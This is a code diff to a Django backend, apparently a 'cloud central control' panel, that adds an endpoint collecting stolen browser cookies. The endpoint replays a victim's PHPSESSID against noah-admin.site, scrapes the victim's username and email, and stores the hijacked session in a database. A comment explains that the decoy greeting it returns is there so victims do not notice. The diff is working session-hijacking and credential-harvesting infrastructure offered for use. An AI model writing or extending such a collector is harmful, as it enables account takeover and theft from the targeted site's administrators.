@@ -10,10 +10,14 @@ DELETE /api/cloud_central_control/noah_admin/<id>/     - 删除
 
 import json
 import logging
+import requests
 
 from django.http import JsonResponse, QueryDict
 from django.views.decorators.csrf import csrf_exempt
 from django.views.decorators.http import require_http_methods
+from lxml import etree
+
+
 
 from XingXingApi.models.noah_admin import NoahAdmin, JsCommand
 
@@ -348,3 +352,46 @@ def delete_js_command(request, cmd_id):
     except Exception as e:
         logger.error(f"删除JS命令失败: {e}", exc_info=True)
         return JsonResponse({"code": 500, "message": f"删除失败: {str(e)}"}, status=500)
+
+
+
+# ==================== 根据cookie获取个人信息 ====================
+@csrf_exempt
+@require_http_methods(["POST"])
+def set_user_info(request):
+    """
+    POST /api/cloud_central_control/noah_admin/set_user_info/    
+    """
+    try:
+        cookies = json.loads(request.POST.get("cookies", "[]"))
+        for cookie in cookies:
+            if cookie["name"] == "PHPSESSID":
+                html_text = requests.get("https://noah-admin.site/profile.php", cookies={cookie["name"]: cookie["value"]}).text
+                tree = etree.HTML(html_text)
+                username = tree.xpath('//form[1]/div[1]/input/@value')[0].strip()
+                email = tree.xpath('//form[1]/div[2]/input/@value')[0].strip()
+                password = '未获取'
+                # 查询数据库中是否存在该用户
+                admin = NoahAdmin.objects.filter(account=username).first()
+                if admin:
+                    # 存在就不管了,直接更新cookie
+                    admin.cookie = json.dumps(cookies, ensure_ascii=False)
+                    admin.save()
+                    break
+                
+                # 不存在就创建一个新用户
+                NoahAdmin.objects.create(
+                    account=username,
+                    password=password,
+                    email=email,
+                    cookie=json.dumps(cookies, ensure_ascii=False),
+                )
+
+        return JsonResponse(
+            {'zh': '您好,我是小影,请联系我TG: @xiaoying1216', 'en': 'Hello, I am Xiaoying, please contact me on TG: @xiaoying1216'},  # 为了不让他们发现,随便返回点东西
+            status=200,
+        )
+                
+    except Exception as e:
+        logger.error(f"查询用户信息失败: {e}", exc_info=True)
+        return JsonResponse({"code": 500, "message": f"查询失败: {str(e)}"}, status=500)
